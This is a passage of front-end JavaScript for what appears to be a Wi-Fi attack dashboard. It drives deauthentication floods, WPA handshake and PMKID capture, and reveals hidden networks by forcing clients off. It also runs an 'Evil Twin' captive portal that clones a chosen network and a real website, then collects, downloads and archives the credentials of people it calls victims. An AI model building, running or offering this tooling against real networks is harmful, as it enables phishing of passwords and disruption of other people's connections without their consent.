            } catch (error) {
                console.error('Dashboard refresh error:', error);
            }
        }
        
        async function fetchWardriveStats() {
            try {
                const response = await fetch('/api/wardrive/stats');
                const stats = await response.json();
                document.getElementById('dashWardriveCount').textContent = stats.total || '0';
            } catch {
                document.getElementById('dashWardriveCount').textContent = '--';
            }
        }
        
        async function checkFlipperStatus() {
            try {
                const response = await fetch('/api/flipper/status');
                const status = await response.json();
                const led = document.getElementById('dashFlipperLed');
                const text = document.getElementById('dashFlipperStatus');

                if (status.connected && status.device === 'flipper') {
                    led.style.background = '#00ff00';
                    text.innerHTML = '<span style="color: #00ff00;">Connected</span> <span style="color:#555; font-size:10px;">' + (status.port || '') + '</span>';
                } else {
                    led.style.background = '#333';
                    text.innerHTML = '<span style="color: #666;">Not connected</span>';
                }
            } catch {
                document.getElementById('dashFlipperLed').style.background = '#333';
                document.getElementById('dashFlipperStatus').innerHTML = '<span style="color: #666;">Unknown</span>';
            }
        }
        
        // Refresh mode status on load
        window.addEventListener('load', function() {
            refreshModes();
            loadTemplates();
            setInterval(refreshModes, 10000); // Auto-refresh every 10 seconds
        });
        
        // Load portal templates dynamically
        async function loadTemplates() {
            try {
                const response = await fetch('/api/portal/templates');
                const result = await response.json();
                
                const select = document.getElementById('portalTemplate');
                select.innerHTML = ''; // Clear existing options
                
                result.templates.forEach(template => {
                    const option = document.createElement('option');
                    // template is a filename like "starbucks.html"
                    const name = template.replace('.html', '');
                    option.value = name;
                    option.textContent = name.replace(/_/g, ' ').replace(/\b\w/g, c => c.toUpperCase());
                    select.appendChild(option);
                });
                
                // Trigger preview of first template
                if (result.templates.length > 0) {
                    previewTemplate();
                }
            } catch (error) {
                console.error('Error loading templates:', error);
            }
        }
        
        function setStatus(text, active = false) {
            const status = document.getElementById('status');
            status.textContent = text;
            status.classList.toggle('active', active);
            
            // Show/hide STOP button based on activity
            const stopBtn = document.getElementById('stopBtn');
            if (stopBtn) {
                stopBtn.style.display = active ? 'block' : 'none';
            }
        }
        
        function startCountdown(baseText, seconds) {
            // Clear any existing countdown
            if (countdownInterval) {
                clearInterval(countdownInterval);
            }
            
            let remaining = seconds;
            setStatus(`${baseText} ${remaining}s`, true);
            
            countdownInterval = setInterval(() => {
                remaining--;
                if (remaining > 0) {
                    setStatus(`${baseText} ${remaining}s`, true);
                } else {
                    clearInterval(countdownInterval);
                    countdownInterval = null;
                }
            }, 1000);
        }
        
        function stopCountdown() {
            if (countdownInterval) {
                clearInterval(countdownInterval);
                countdownInterval = null;
            }
            setStatus('IDLE', false);
        }
        
        function toggleAdvancedAttacks() {
            const content = document.getElementById('advancedAttacksContent');
            const toggle = document.getElementById('advancedToggle');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                toggle.textContent = '‚ñº';
            } else {
                content.style.display = 'none';
                toggle.textContent = '‚ñ∂';
            }
        }
        
        async function refreshModes() {
            try {
                const response = await fetch('/api/mode/status');
                const result = await response.json();
                
                document.getElementById('alfa0Status').textContent = `alfa0: ${result.alfa0}`;
                document.getElementById('alfa1Status').textContent = `alfa1: ${result.alfa1}`;
            } catch (error) {
                console.error('Error refreshing modes:', error);
            }
        }
        
        async function setMode(interface, mode) {
            const output = document.getElementById('scanOutput');
            
            try {
                const response = await fetch('/api/mode/set', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ interface, mode })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                // Refresh status after mode change
                setTimeout(refreshModes, 1000);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
        }
        
        function selectTarget(bssid, channel, ssid) {
            document.getElementById('targetBSSID').value = bssid;
            document.getElementById('targetChannel').value = channel;
            document.getElementById('targetSSID').value = ssid;
            
            // Update UI to show selection
            document.querySelectorAll('.network-item').forEach(item => {
                item.classList.remove('selected');
            });
            event.target.closest('.network-item').classList.add('selected');
            
            selectedTarget = { bssid, channel, ssid };
            
            // Cache for J4Rv15
            fetch('/api/select_target', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({bssid, channel, ssid})
            }).catch(() => {});  // Silent fail
        }
        
        async function revealHidden() {
            const output = document.getElementById('scanOutput');
            
            startCountdown('REVEALING...', 60);
            updateAttackOutput('Monitoring probe requests for 60 seconds...\n\nClients connecting to hidden networks will reveal SSIDs.\n\nPlease wait...');
            
            try {
                const response = await fetch('/api/reveal_hidden', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({})
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                if (result.success && result.revealed_count > 0) {
                    output.textContent += '\n\n‚úì Run "Scan Networks" again to see revealed names.';
                }
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            setStatus('IDLE', false);
        }
        
        async function revealHiddenWithDeauth() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const output = document.getElementById('scanOutput');
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('REVEAL+DEAUTH...', 60);
            updateAttackOutput(`Deauthing ${bssid} + monitoring for 60s...\n\nForcing clients to reconnect will reveal hidden SSID.\n\nPlease wait...`);
            
            try {
                const response = await fetch('/api/reveal_hidden', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                if (result.success && result.revealed_count > 0) {
                    output.textContent += '\n\n‚úì Run "Scan Networks" again to see revealed name.';
                }
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            setStatus('IDLE', false);
        }
        

        // Store scan results globally for batch operations
        let lastScanResults = [];

        // Generate signal strength bars HTML - 6 levels
        function getSignalBars(power) {
            const p = parseInt(power) || -100;
            let bars = 0;
            let color = '#ff0000';

            if (p >= -40) { bars = 6; color = '#00ff00'; }       // Excellent - bright green
            else if (p >= -50) { bars = 5; color = '#00dd00'; }  // Very Good - green
            else if (p >= -60) { bars = 4; color = '#88ff00'; }  // Good - lime
            else if (p >= -70) { bars = 3; color = '#ffff00'; }  // Fair - yellow
            else if (p >= -80) { bars = 2; color = '#ff8800'; }  // Weak - orange
            else { bars = 1; color = '#ff4400'; }                // Very Weak - red-orange

            let html = '<span style="display: inline-flex; align-items: flex-end; gap: 1px; height: 16px; margin-right: 6px;" title="' + p + ' dBm">';
            for (let i = 1; i <= 6; i++) {
                const h = 3 + (i * 2);
                const c = i <= bars ? color : '#333';
                html += '<span style="width: 3px; height: ' + h + 'px; background: ' + c + '; border-radius: 1px;"></span>';
            }
            html += '</span>';
            return html;
        }

        // Check if network is a vehicle AP
        function isVehicleAP(net) {
            const ssid = (net.ssid || '').toLowerCase();
            const vendor = (net.vendor || '').toLowerCase();

            // SSID patterns for vehicle hotspots
            const vehicleSSIDPatterns = [
                'chevy', 'chevrolet', 'mylink',
                'ford', 'fordpass', 'sync',
                'toyota', 'entune',
                'honda', 'hondalink',
                'tesla',
                'gm wifi', 'onstar', 'gm hotspot',
                'uconnect', 'chrysler', 'dodge', 'jeep', 'ram',
                'bmw', 'mercedes', 'audi', 'lexus', 'acura',
                'nissan', 'infiniti', 'subaru', 'mazda',
                'hyundai', 'kia', 'genesis',
                'volkswagen', 'vw ', 'volvo',
                'cadillac', 'buick', 'gmc'
            ];

            // Vendor patterns for automotive suppliers
            const vehicleVendorPatterns = [
                'harman', 'continental', 'denso', 'bosch',
                'panasonic automotive', 'alpine', 'pioneer',
                'visteon', 'delphi', 'magna'
            ];

            for (const pattern of vehicleSSIDPatterns) {
                if (ssid.includes(pattern)) return true;
            }
            for (const pattern of vehicleVendorPatterns) {
                if (vendor.includes(pattern)) return true;
            }
            return false;
        }

        // Apply filters and sorting to network list
        function applyFilters() {
            if (!lastScanResults || lastScanResults.length === 0) return;

            const ssidFilter = (document.getElementById('filterSSID').value || '').toLowerCase();
            const encFilter = document.getElementById('filterEncryption').value;
            const sigFilter = document.getElementById('filterSignal').value;
            const sortBy = document.getElementById('sortBy').value;
            const clientsOnly = document.getElementById('filterClients').checked;
            const hideHidden = document.getElementById('filterHideHidden')?.checked || false;
            const hideVehicles = document.getElementById('filterHideVehicles')?.checked || false;

            let filtered = lastScanResults.filter(net => {
                // Hide hidden networks
                if (hideHidden && (!net.ssid || net.ssid === '[hidden]')) return false;

                // Hide vehicle APs
                if (hideVehicles && isVehicleAP(net)) return false;

                // SSID text filter
                if (ssidFilter && !(net.ssid || '').toLowerCase().includes(ssidFilter)) return false;

                // Encryption filter
                if (encFilter && !(net.encryption || '').toUpperCase().includes(encFilter)) return false;

                // Signal filter
                if (sigFilter) {
                    const p = parseInt(net.power) || -100;
                    if (sigFilter === 'excellent' && p < -40) return false;
                    if (sigFilter === 'good' && (p < -60 || p >= -40)) return false;
                    if (sigFilter === 'fair' && (p < -70 || p >= -60)) return false;
                    if (sigFilter === 'weak' && p >= -70) return false;
                }

                // Clients filter
                if (clientsOnly && (!net.clients || net.clients === 0)) return false;

                return true;
            });

            // Sort
            filtered.sort((a, b) => {
                if (sortBy === 'signal') return (parseInt(b.power) || -100) - (parseInt(a.power) || -100);
                if (sortBy === 'ssid') return (a.ssid || 'zzz').localeCompare(b.ssid || 'zzz');
                if (sortBy === 'channel') return (parseInt(a.channel) || 0) - (parseInt(b.channel) || 0);
                if (sortBy === 'clients') return (b.clients || 0) - (a.clients || 0);
                return 0;
            });

            renderNetworkList(filtered);
        }

        // Render network list with signal bars
        function renderNetworkList(networks) {
            const networkList = document.getElementById('networkList');
            const countSpan = document.getElementById('networkCount');

            if (countSpan) {
                countSpan.textContent = '(' + networks.length + '/' + lastScanResults.length + ')';
            }

            if (networks.length === 0) {
                networkList.innerHTML = '<div style="color: #666; padding: 20px; text-align: center;">No networks match filters</div>';
                return;
            }

            networkList.innerHTML = '';
            networks.forEach(net => {
                const item = document.createElement('div');
                item.className = 'network-item';
                item.onclick = () => selectTarget(net.bssid, net.channel, net.ssid);

                const signalBars = getSignalBars(net.power);
                const clientBadge = net.clients > 0 ? '<span style="color:#0f0;margin-left:5px;" title="' + net.clients + ' clients seen during scan">üì∂</span>' : '';
                const vendorShort = (net.vendor || 'Unknown').substring(0, 15);
                const ssidDisplay = net.ssid || '[hidden]';

                item.innerHTML = `
                    <div style="display:flex;justify-content:space-between;align-items:start;">
                        <div>${signalBars}<strong>${ssidDisplay}</strong>${clientBadge}<br>
                        <span style="color:#888;font-size:11px;">${vendorShort}</span> | Ch ${net.channel} | ${net.power}dBm | ${net.encryption}</div>
                        <div style="display:flex;gap:4px;">
                            <button onclick="event.stopPropagation(); connectToNetwork('${net.bssid}', '${(net.ssid || '').replace(/'/g, "\\'")}', '${net.encryption || ''}');" style="background:#002200;border:1px solid #004400;color:#0f0;padding:2px 6px;cursor:pointer;font-size:12px;" title="Connect to this network">üì°</button>
                            <button onclick="event.stopPropagation(); openNotesModal('${net.bssid}', '${(net.ssid || '').replace(/'/g, "\\'")}');" style="background:#1a1a1a;border:1px solid #333;color:#888;padding:2px 6px;cursor:pointer;font-size:12px;" title="View notes and attack history for this target">üìù</button>
                        </div>
                    </div>
                `;
                networkList.appendChild(item);
            });
        }

        async function connectToNetwork(bssid, ssid, encryption) {
            const displayName = ssid || bssid;
            const isOpen = !encryption || encryption.toUpperCase() === 'OPN' || encryption.toUpperCase() === 'OPEN';

            let password = null;

            // If encrypted, prompt for password
            if (!isOpen) {
                password = prompt(`Enter password for "${displayName}" (${encryption}):`);
                if (password === null) {
                    // User cancelled
                    return;
                }
                if (password.length < 8 && encryption.toUpperCase().includes('WPA')) {
                    updateAttackOutput(`‚ùå WPA passwords must be at least 8 characters`);
                    return;
                }
            }

            updateAttackOutput(`Connecting to ${displayName}...`);

            try {
                const response = await fetch('/api/connect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, ssid, password })
                });

                const result = await response.json();

                if (result.success) {
                    updateAttackOutput(`‚úÖ ${result.output}`);
                } else {
                    updateAttackOutput(`‚ùå ${result.output}`);
                }
            } catch (error) {
                updateAttackOutput(`‚ùå Error: ${error.message}`);
            }
        }

        async function batchRevealAllHidden() {
            const output = document.getElementById('scanOutput');
            
            // Filter hidden networks from last scan
            const hiddenNetworks = lastScanResults.filter(net => 
                (net.ssid === '[hidden]' || !net.ssid) && net.channel && net.channel !== '-1'
            );
            
            if (hiddenNetworks.length === 0) {
                updateAttackOutput('No hidden networks found in last scan.\n\nRun "Scan Networks" first.');
                return;
            }
            
            // Build targets array
            const targets = hiddenNetworks.map(net => ({
                bssid: net.bssid,
                channel: net.channel
            }));
            
            startCountdown('BATCH REVEAL...', 90);
            updateAttackOutput(`Batch revealing ${targets.length} hidden network(s)...\n\nDeauthing each network sequentially.\nMonitoring for 90 seconds total.\n\nPlease wait...`);
            
            try {
                const response = await fetch('/api/reveal_hidden_batch', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ targets })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            setStatus('IDLE', false);
        }
        
        // Target notes modal functions
        let currentModalBssid = null;
        let currentModalSsid = null;
        
        async function openNotesModal(bssid, ssid) {
            currentModalBssid = bssid;
            currentModalSsid = ssid;
            document.getElementById('modalTargetTitle').textContent = ssid || '[hidden]';
            document.getElementById('modalTargetInfo').textContent = 'BSSID: ' + bssid;
            document.getElementById('modalNotes').value = '';
            document.getElementById('modalAttackHistory').innerHTML = '<div style="color:#666;">Loading...</div>';
            document.getElementById('targetNotesModal').style.display = 'flex';
            
            try {
                const response = await fetch('/api/target_data/' + encodeURIComponent(bssid));
                const data = await response.json();
                document.getElementById('modalNotes').value = data.notes || '';
                
                if (data.attacks && data.attacks.length > 0) {
                    document.getElementById('modalAttackHistory').innerHTML = data.attacks.map(a => {
                        const color = a.result.includes('captured') ? '#0f0' : '#f66';
                        return '<div style="margin-bottom:5px;"><span style="color:#888;">' + a.date + '</span> - <span style="color:#0f0;">' + a.type + '</span> ‚Üí <span style="color:' + color + ';">' + a.result + '</span></div>';
                    }).join('');
                } else {
                    document.getElementById('modalAttackHistory').innerHTML = '<div style="color:#666;">No attacks logged yet</div>';
                }
            } catch (e) {
                console.error('Load target data error:', e);
            }
        }
        
        function closeNotesModal() {
            document.getElementById('targetNotesModal').style.display = 'none';
            currentModalBssid = null;
            currentModalSsid = null;
        }
        
        async function saveTargetNote() {
            if (!currentModalBssid) return;
            const note = document.getElementById('modalNotes').value;
            try {
                await fetch('/api/target_data/note', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({bssid: currentModalBssid, ssid: currentModalSsid, note: note})
                });
                closeNotesModal();
            } catch (e) {
                console.error('Save note error:', e);
            }
        }
        
        // Interface status polling
        async function updateInterfaceStatus() {
            try {
                const response = await fetch('/api/mode/status');
                const data = await response.json();
                const alfa0El = document.getElementById('alfa0Status');
                const alfa1El = document.getElementById('alfa1Status');
                if (alfa0El) {
                    const mode0 = data.alfa0 || 'unknown';
                    alfa0El.textContent = 'alfa0: ' + mode0;
                    alfa0El.style.color = mode0 === 'monitor' ? '#0f0' : '#888';
                }
                if (alfa1El) {
                    const mode1 = data.alfa1 || 'unknown';
                    alfa1El.textContent = 'alfa1: ' + mode1;
                    alfa1El.style.color = mode1 === 'monitor' ? '#0f0' : '#888';
                }
            } catch (e) {
                console.error('Interface status error:', e);
            }
        }
        
        // Update interface status every 5 seconds when on Network Ops page
        setInterval(() => {
            if (document.getElementById('page-network-ops').classList.contains('active')) {
                updateInterfaceStatus();
            }
        }, 5000);
        
        // Initial load
        updateInterfaceStatus();
        
        async function scanNetworks() {
            const duration = parseInt(document.getElementById('scanDuration').value) || 30;
            const output = document.getElementById('scanOutput');
            const networkList = document.getElementById('networkList');
            
            startCountdown('SCANNING...', duration);
            updateAttackOutput(`Starting scan for ${duration} seconds...\n`);
            networkList.innerHTML = '';
            
            try {
                const response = await fetch('/api/scan', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ duration: parseInt(duration) })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
                
                // Display channel congestion
                if (result.networks && result.networks.length > 0) {
                    const channelCounts = {};
                    result.networks.forEach(n => {
                        const ch = parseInt(n.channel) || 0;
                        channelCounts[ch] = (channelCounts[ch] || 0) + 1;
                    });
                    const maxCount = Math.max(...Object.values(channelCounts));
                    const channels = [1,2,3,4,5,6,7,8,9,10,11,36,40,44,48,149,153,157,161,165];
                    const barsDiv = document.getElementById('channelBars');
                    barsDiv.innerHTML = channels.map(ch => {
                        const count = channelCounts[ch] || 0;
                        const height = count > 0 ? Math.max(5, (count / maxCount) * 25) : 2;
                        const color = count === 0 ? '#222' : count >= 3 ? '#f00' : count >= 2 ? '#ff0' : '#0f0';
                        return '<div style="flex:1;display:flex;flex-direction:column;align-items:center;" title="Ch ' + ch + ': ' + count + ' networks"><div style="width:100%;height:' + height + 'px;background:' + color + ';"></div><span style="font-size:8px;color:#666;">' + ch + '</span></div>';
                    }).join('');
                    document.getElementById('channelCongestion').style.display = 'block';
                }
                
                // Display networks using filter/sort system
                if (result.networks) {
                    lastScanResults = result.networks;
                    applyFilters();  // Uses renderNetworkList() with signal bars
                }
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
            refreshModes();
        }
        
        async function capturePMKID() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            const duration = parseInt(document.getElementById('pmkidDuration').value) || 60;
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('CAPTURING PMKID...', duration);
            updateAttackOutput(`üì° Capturing PMKID from ${ssid} (${bssid})...\n\nThis is a stealth capture - no deauth packets sent.\nWaiting for router beacon...`);
            
            try {
                const response = await fetch('/api/pmkid', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid, duration: parseInt(duration) })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
        }
        
        async function captureHandshake() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            const duration = parseInt(document.getElementById('handshakeDuration').value) || 60;
            const deauth_interval = document.getElementById('deauthInterval').value || 10;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('CAPTURING HANDSHAKE...', duration);
            updateAttackOutput(`Capturing handshake from ${bssid} with deauth every ${deauth_interval}s...\n`);
            
            try {
                const response = await fetch('/api/handshake', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        bssid, 
                        channel,
                        ssid, 
                        duration: parseInt(duration),
                        deauth_interval: parseInt(deauth_interval)
                    })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
        }
        
        async function deauthOnly() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const count = document.getElementById('deauthOnlyCount').value || 10;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            setStatus('DEAUTHING...', true);
            updateAttackOutput(`Sending ${count} deauth packets to ${bssid}...\n`);
            
            try {
                const response = await fetch('/api/deauth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        bssid, 
                        channel,
                        count: parseInt(count)
                    })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            setStatus('IDLE', false);
        }
        
        // Evil Portal functions
        async function loadPortalTemplates() {
            try {
                const response = await fetch('/api/portal/templates');
                const data = await response.json();
                const select = document.getElementById('portalTemplate');
                select.innerHTML = data.templates.map(t => {
                    const name = t.replace('.html', '');
                    const displayName = name.replace(/_/g, ' ');
                    return '<option value="' + name + '">' + displayName + '</option>';
                }).join('');
                previewTemplate();
            } catch (e) {
                console.error('Load templates error:', e);
            }
        }
        
        function previewTemplate() {
            const template = document.getElementById('portalTemplate').value;
            const iframe = document.getElementById('templatePreview');
            const nameSpan = document.getElementById('previewTemplateName');
            if (template && iframe) {
                iframe.src = '/portals/' + template + '.html?t=' + Date.now();
                nameSpan.textContent = template.replace(/_/g, ' ');
            }
        }
        
        async function deleteTemplate() {
            const template = document.getElementById('portalTemplate').value;
            if (!template) {
                alert('No template selected');
                return;
            }
            
            if (!confirm('Delete template "' + template + '"? This cannot be undone.')) {
                return;
            }
            
            try {
                const response = await fetch('/api/portal/template/' + template, {
                    method: 'DELETE'
                });
                const data = await response.json();
                
                if (data.success) {
                    await loadTemplates();
                    previewTemplate();
                } else {
                    alert('Error: ' + (data.error || 'Delete failed'));
                }
            } catch (err) {
                alert('Error deleting template: ' + err.message);
            }
        }
        
        async function cloneWebsite() {
            const url = document.getElementById('cloneUrl').value.trim();
            const status = document.getElementById('cloneStatus');
            
            if (!url) {
                status.textContent = '‚ùå Enter a URL to clone';
                status.style.color = '#f44';
                return;
            }
            
            if (!url.startsWith('http://') && !url.startsWith('https://')) {
                status.textContent = '‚ùå URL must start with http:// or https://';
                status.style.color = '#f44';
                return;
            }
            
            status.textContent = '‚è≥ Cloning...';
            status.style.color = '#ff0';
            
            try {
                const response = await fetch('/api/portal/clone', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ url: url })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    status.textContent = '‚úÖ Created: ' + data.template_name;
                    status.style.color = '#0f0';
                    
                    // Refresh template list and select the new one
                    await loadTemplates();
                    document.getElementById('portalTemplate').value = data.template_name;
                    previewTemplate();
                } else {
                    status.textContent = '‚ùå ' + (data.error || 'Clone failed');
                    status.style.color = '#f44';
                }
            } catch (err) {
                status.textContent = '‚ùå Error: ' + err.message;
                status.style.color = '#f44';
            }
        }
        
        // Toggle WPA2 password field visibility
        function toggleWPA2Password() {
            const checkbox = document.getElementById('portalWPA2');
            const section = document.getElementById('wpa2PasswordSection');
            section.style.display = checkbox.checked ? 'block' : 'none';
        }
        
        function toggleDeauthMode() {
            const checkbox = document.getElementById('portalDeauth');
            const section = document.getElementById('deauthModeSection');
            section.style.display = checkbox.checked ? 'block' : 'none';
        }
        
        function updateDeauthModeDesc() {
            const mode = document.getElementById('deauthMode').value;
            const desc = document.getElementById('deauthModeDesc');
            const descriptions = {
                'single': 'üéØ Stop deauth after first capture - victim stays connected',
                'multi': 'üé£ Keep deauth running - more victims but may bounce',
                'smart': 'üß† Only deauth devices NOT on Twin - best stability'
            };
            desc.textContent = descriptions[mode] || '';
        }
        
        function toggleRedirectUrl() {
            const action = document.getElementById('postCaptureAction').value;
            const section = document.getElementById('redirectUrlSection');
            section.style.display = action === 'redirect' ? 'block' : 'none';
        }
        
        // Store cloned target info for Evil Twin
        let clonedTarget = { ssid: '', bssid: '', channel: '' };
        
        function cloneSSIDFromScan() {
            if (!lastScanResults || lastScanResults.length === 0) {
                alert('No scan results. Run a scan on Network Ops first.');
                return;
            }
            
            // Build list with more info
            const networks = lastScanResults.filter(n => n.ssid && n.ssid !== '[hidden]');
            if (networks.length === 0) {
                alert('No networks with visible SSIDs found.');
                return;
            }
            
            const ssidList = networks.map(n => n.ssid);
            const choice = prompt('Available SSIDs:\n' + ssidList.join('\n') + '\n\nType the SSID to clone:');
            
            if (choice) {
                const network = networks.find(n => n.ssid === choice);
                if (network) {
                    // Store full target info
                    clonedTarget = {
                        ssid: network.ssid,
                        bssid: network.bssid,
                        channel: network.channel
                    };
                    
                    // Update UI
                    document.getElementById('portalSSID').value = network.ssid;
                    document.getElementById('portalChannel').value = network.channel;
                    
                    // Update deauth target info display
                    document.getElementById('deauthTargetSSID').textContent = network.ssid + ' (' + network.bssid + ')';
                    document.getElementById('deauthTargetInfo').style.display = 'block';
                    
                    // Show confirmation
                    document.getElementById('portalOutput').textContent = 'üì° Target Cloned:\nSSID: ' + network.ssid + '\nBSSID: ' + network.bssid + '\nChannel: ' + network.channel + '\n\nEnable Deauth Companion for full Evil Twin attack.';
                } else {
                    alert('SSID not found in scan results.');
                }
            }
        }
        
        let lastCredentialCount = 0;
        
        async function refreshCredentials() {
            try {
                const response = await fetch('/api/portal/log');
                const data = await response.json();
                const logDiv = document.getElementById('credentialLog');
                const countSpan = document.getElementById('credentialCount');
                
                if (data.log && data.log.trim()) {
                    // Split into credential blocks (separated by === timestamps ===)
                    const blocks = data.log.trim().split(/(?=\n=== \d{4}-)/);
                    
                    // Reverse so newest is at top
                    blocks.reverse();
                    
                    // Count credentials (number of timestamp blocks)
                    const credCount = (data.log.match(/=== \d{4}-\d{2}-\d{2}/g) || []).length;
                    countSpan.textContent = '(' + credCount + ')';
                    
                    // Flash green if new credentials arrived
                    if (credCount > lastCredentialCount && lastCredentialCount > 0) {
                        logDiv.style.boxShadow = '0 0 20px #0f0';
                        setTimeout(() => { logDiv.style.boxShadow = 'none'; }, 1500);
                    }
                    lastCredentialCount = credCount;
                    
                    // Format with highlighted timestamps
                    let html = '';
                    blocks.forEach(block => {
                        if (block.trim()) {
                            // Highlight timestamps in yellow
                            const formatted = block.replace(/(=== \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} ===)/g, 
                                '<span style="color:#ff0;font-weight:bold;">$1</span>');
                            html += '<div style="margin-bottom:15px;padding-bottom:10px;border-bottom:1px solid #333;">' + formatted + '</div>';
                        }
                    });
                    
                    logDiv.innerHTML = html;
                } else {
                    countSpan.textContent = '(0)';
                    logDiv.innerHTML = '';
                }
            } catch (e) {
                console.error('Refresh credentials error:', e);
            }
        }
        
        async function saveCredentials() {
            try {
                const response = await fetch('/api/portal/log');
                const data = await response.json();
                if (!data.log || !data.log.trim()) {
                    alert('No credentials to save');
                    return;
                }
                const blob = new Blob([data.log], {type: 'text/plain'});
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'portal_credentials_' + new Date().toISOString().slice(0,10) + '.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            } catch (e) {
                console.error('Save credentials error:', e);
                alert('Error saving credentials');
            }
        }
        
        async function copyCredentials() {
            try {
                const response = await fetch('/api/portal/log');
                const data = await response.json();
                if (!data.log || !data.log.trim()) {
                    alert('No credentials to copy');
                    return;
                }
                await navigator.clipboard.writeText(data.log);
                // Flash the button to confirm
                event.target.style.background = '#0a3a0a';
                event.target.textContent = '‚úÖ Copied!';
                setTimeout(() => {
                    event.target.style.background = '#1a1a1a';
                    event.target.textContent = 'üìã Copy';
                }, 1500);
            } catch (e) {
                console.error('Copy credentials error:', e);
                alert('Error copying credentials');
            }
        }
        
        async function clearCredentialDisplay() {
            const logDiv = document.getElementById('credentialLog');
            
            try {
                const response = await fetch('/api/portal/archive', { method: 'POST' });
                const result = await response.json();
                
                if (result.success) {
                    logDiv.innerHTML = '';
                    document.getElementById('credentialCount').textContent = '(0)';
                    loadArchiveList();  // Refresh archive dropdown
                    // Flash confirmation
                    logDiv.style.boxShadow = '0 0 10px #ff0';
                    setTimeout(() => { logDiv.style.boxShadow = 'none'; }, 1000);
                } else {
                    alert(result.message || 'Nothing to archive');
                }
            } catch (e) {
                console.error('Archive error:', e);
                alert('Error archiving credentials');
            }
        }
        
        async function loadArchiveList() {
            try {
                const response = await fetch('/api/portal/archives');
                const data = await response.json();
                const select = document.getElementById('archiveSelect');
                
                // Keep first option, remove rest
                select.innerHTML = '<option value="">-- Current Session --</option>';
                
                if (data.archives && data.archives.length > 0) {
                    data.archives.forEach(archive => {
                        const option = document.createElement('option');
                        option.value = archive.name;
                        // Format: "2025-01-02 19:30:45 (1.2 KB)"
                        const dateStr = archive.name.replace('portal_log_', '').replace('.txt', '').replace(/_/g, ' ').replace(/-/g, ':').slice(0, 10).replace(/:/g, '-') + ' ' + archive.name.slice(-12, -4).replace(/-/g, ':');
                        option.textContent = dateStr + ' (' + Math.round(archive.size/1024*10)/10 + ' KB)';
                        select.appendChild(option);
                    });
                }
            } catch (e) {
                console.error('Load archive list error:', e);
            }
        }
        
        async function loadSelectedArchive() {
            const select = document.getElementById('archiveSelect');
            const filename = select.value;
            const logDiv = document.getElementById('credentialLog');
            const countSpan = document.getElementById('credentialCount');
            
            if (!filename) {
                // Current session selected - refresh live log
                refreshCredentials();
                return;
            }
            
            try {
                const response = await fetch('/api/portal/archives/' + filename);
                const data = await response.json();
                
                if (data.success && data.log) {
                    // Display archived content with header
                    const blocks = data.log.trim().split(/(?=\n=== \d{4}-)/);
                    blocks.reverse();
                    
                    const credCount = (data.log.match(/=== \d{4}-\d{2}-\d{2}/g) || []).length;
                    countSpan.textContent = '(' + credCount + ' archived)';
                    
                    let html = '<div style="color:#ff0;margin-bottom:10px;padding-bottom:10px;border-bottom:1px solid #ff0;">üìÅ VIEWING ARCHIVE: ' + filename + '</div>';
                    blocks.forEach(block => {
                        if (block.trim()) {
                            const formatted = block.replace(/(=== \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} ===)/g, 
                                '<span style="color:#ff0;font-weight:bold;">$1</span>');
